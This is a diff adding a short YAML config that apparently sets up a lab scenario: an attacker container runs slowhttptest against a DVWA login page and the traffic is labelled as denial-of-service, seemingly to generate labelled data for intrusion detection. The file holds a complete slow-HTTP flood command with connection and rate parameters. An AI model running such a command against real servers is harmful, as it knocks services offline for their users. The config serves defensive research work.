@@ -1,0 +1,17 @@
+attacker:
+  name: slowhttptest
+  image: ghcr.io/simonhondekyn/slowhttptest-mozilla-5.0:cic
+  atkCommand: slowhttptest -c 1000 -B -i 110 -r 200 -s 8192 -t FAKEVERB -u http://$TARGET_IP:80/dv/login.php -x 10 -p 3
+target:
+  name: dvwa-impossible
+  image: ghcr.io/simonhondekyn/dvwa-impossible:cic
+  startupProbe:
+    httpGet:
+      path: /
+      port: 80
+    initialDelaySeconds: 5
+    periodSeconds: 5
+labels:
+  label: 1
+  category: "denial-of-service"
+  subcategory: "slowhttptest"
